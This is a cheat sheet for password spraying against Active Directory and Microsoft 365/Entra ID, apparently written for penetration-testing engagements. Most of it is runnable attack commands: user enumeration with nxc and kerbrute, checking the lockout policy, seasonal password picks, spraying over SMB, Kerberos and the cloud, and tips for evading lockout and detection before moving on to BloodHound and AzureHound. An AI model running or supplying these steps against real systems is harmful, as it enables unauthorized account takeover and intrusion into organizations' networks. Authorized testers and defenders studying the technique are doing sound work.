Password Spraying - Cheat Sheet

Try ONE common password against MANY accounts (instead of many passwords
against one account) to avoid lockouts and find weak credentials. Works
on-prem (SMB/Kerberos/LDAP) and in the cloud (M365 / Entra ID).
Replace the placeholders (<...>) with your own values.


Step 1 - Build the user list

Get valid usernames first (spraying needs targets). Sources:

  - AD enumeration: nxc / ldapsearch / RID brute
        nxc smb <dc-ip> -u <user> -p <password> --users
        nxc smb <dc-ip> -u '' -p '' --rid-brute        (null session)
  - Kerberos user enum (no creds needed, no logon events):
        kerbrute userenum -d <domain> --dc <dc-ip> users.txt
  - OSINT for cloud: company email format (first.last@company.com) + LinkedIn

Save one username per line in users.txt.


Step 2 - CHECK THE LOCKOUT POLICY FIRST (critical)

Spraying blindly locks out accounts and burns your engagement. Read it:

    nxc smb <dc-ip> -u <user> -p <password> --pass-pol

Note "Account lockout threshold" and "Reset lockout counter after".
Rule of thumb: stay 1-2 attempts UNDER the threshold, per the reset window.
If threshold is 5 / 30 min -> spray 1 password, wait 30+ min, repeat.


Step 3 - Pick passwords (one at a time)

Seasonal / company-themed beats giant wordlists for spraying:

    Spring2026!   Summer2026!   <CompanyName>1!   Welcome1!   Password1
    <Company>2026   Changeme123!

One password per spray round.


Step 4 - Spray on-prem (SMB)

    nxc smb <dc-ip> -u users.txt -p 'Spring2026!' --continue-on-success

Look for [+] = valid. Add --no-bruteforce to pair users.txt:passwords.txt
line-by-line instead of full matrix:

    nxc smb <dc-ip> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success


Step 4b - Spray via Kerberos (kerbrute - quieter, no SMB)

    kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Spring2026!'

Kerberos pre-auth failures are stealthier than SMB logon failures.


Step 5 - Spray the cloud (M365 / Entra ID)

    # MSOLSpray (against Azure AD / login.microsoftonline.com)
    python3 MSOLSpray.py --userlist users.txt --password 'Spring2026!'

    # o365 / Entra spray with nxc-style tooling, or TREVORspray
    trevorspray -u users.txt -p 'Spring2026!'

Cloud spraying tells you valid creds AND often whether MFA is enabled per user.
Watch for Smart Lockout (Entra) - it throttles by IP; spread sources if needed.


Step 6 - Use what hits

  - on-prem cred -> nxc / evil-winrm, then BloodHound from that user
  - check for password reuse across SMB / WinRM / RDP / the cloud
  - cloud cred (no MFA) -> sign in, enumerate (roadrecon / AzureHound)


Cautions
  - Never spray without seeing the lockout policy.
  - One password per round; track time between rounds.
  - --continue-on-success so a single hit doesn't stop the run.


Key idea: spraying flips brute force sideways - low-and-slow across many users
with one likely password stays under per-account lockout thresholds. The win
is usually one weak/reused password (seasonal patterns are everywhere). The
biggest mistake is spraying before reading the lockout policy - that locks
accounts, alerts defenders, and can fail the whole engagement.
